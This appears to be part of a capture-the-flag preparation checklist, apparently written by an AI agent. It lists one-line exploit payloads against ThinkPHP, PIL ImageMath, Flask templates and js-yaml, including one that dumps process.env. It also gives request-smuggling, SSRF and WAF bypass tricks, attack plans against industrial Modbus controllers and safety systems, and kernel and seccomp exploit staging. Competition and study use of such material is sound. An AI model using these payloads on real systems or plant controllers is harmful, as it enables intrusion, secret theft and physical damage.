- [ ] ThinkPHP 5.0.23: `_method=__construct&filter[]=system&method=get&get[]=id`; 5.0.20: `?s=index/\think\Request/input&filter[]=system&data=id`.
- [ ] PIL ImageMath RCE: `?mode=__import__('os').popen('id').read()` (blacklist misses `__import__`).
- [ ] Flask SSTI: `{{cycler.__init__.__globals__.os.popen('id').read()}}` (service literally named "Cobalt").
- [ ] WAF bypass: JSON `\uXXXX`-escape every blocked key (`__proto__`, `outputFunctionName`).
- [ ] js-yaml v3 RCE: `toJSON: !<tag:yaml.org,2002:js/function> "function(){return JSON.stringify(process.env)}"`.
- [ ] NoSQL scope bypass: `filter={"$or":[{"owner":{"$exists":true}}]}` (strip decoy `admin*` owners).
- [ ] CL.TE smuggling: dup `Transfer-Encoding: chunked` + `Transfer-Encoding: x`, raw socket, `sleep(15)`.
- [ ] Path traversal vs single-pass replace: `"../"*9 + /app/config/...`.
- [ ] SSRF filter bypass: decimal IP (`http://2887770626:4000/`) + uppercase host (`FURNACE`).
- [ ] Rate-limiter bypass: alternate path casing (`/Api/...`) to miss OpenResty's exact-path key.

**OT clients (pre-write, no external deps):**
- [ ] Raw Modbus/TCP client (MBAP + FC `01/03/04/05/06/16`) with **one persistent connection** and read-back verification (OT#001, OT#007).
- [ ] Custom binary-protocol harness with **per-opcode exact response framing** and **both endiannesses** tested (OT#002 Aurora, OT#004 mixed BE-transport/LE-message).
- [ ] Remember: flag only appears **while the dangerous condition is actively sustained** (loop the write, poll the flag registers/node during danger, not after the trip).
- [ ] OT logic checklist: setpoint clamp ≠ measurement clamp (001); no synchro-check → close at Δ≈180° (002); unauth maintenance-override coil (007); SIS sharing the process session/address space (004); SSRF IP-encoding/case bypass to reach the plant (003).

**Pwn staging:**
- [ ] Cross-arch qemu-user + toolchains: PPC32, ARM/Thumb, MIPS, RISC-V64, AArch64 (the "Vault" series).
- [ ] seccomp-aware templates: ORW chain + `write(1, environ, n)` flag-leak when `execve` blocked; always read the seccomp filter first (narration lies).
- [ ] Remote-vs-local binary fingerprinting (offsets can differ by `+0x10`).
- [ ] Kernel-pwn kit: UAF-via-missing-NULL + leak-ioctl KASLR defeat + `commit_creds` ROP (SMAP-off = userland payloads OK).

**Crypto/Forensics/Rev staging:**
- [ ] factordb/yafu first on any RSA `n`; CFB-keystream-XOR recovery snippet; linear/poly known-plaintext solver (sympy/sage).
- [ ] tshark DDoS cheat-sheet; binwalk/zsteg/exiftool/foremost; `ftkimager`/Autopsy for `.ad1`.
- [ ] Recognize malware-derived reverses (BPFdoor magic trigger, Mirai config decryption).
- [ ] If a "vuln research" track appears: AFL++/libFuzzer + ASAN builds of the shipped library.

---

## Unfetched / pending (not invented — stated per instructions)

- **`h4ckyou/h4ckyou.github.io` → `posts/ctf/battlectf24/writeup.md`**: the full git clone **completed**
  (HEAD `30be7dc`), but the referenced writeup **is not in the repo**. It is a Jekyll blog; all content is
  under `_posts/*.md`, and a case-insensitive `grep -ri 'battlectf\|bugpwn' _posts/` returns **nothing**
  (the posts cover ICC25, CSEAN-CTF, picoCTF26, ECOWAS26, HTB, kernel series — no BattleCTF). The direct
  raw URLs (`.../main/...` and `.../master/...`) also 404'd. Conclusion: the battlectf24 writeup was
  **never present (or removed from history)** — nothing was fetched or invented from it. The 2024
  BattleCTF pwn space is still covered above via `BattleCTF2k24/` and `AfricabattleCTF2024/Qualifier/Pwn/`
  (poj ret2libc, universe seccomp-ORW, kami AArch64).
- No **crypto/reverse** player writeups exist in the 2026 Qualifier repos (that edition's public
  writeups cover web/pwn/OT/vuln-research/out-context only); the crypto/reverse sections above are built
  from **2023 Prequal source files on disk**, not from 2026 writeups.
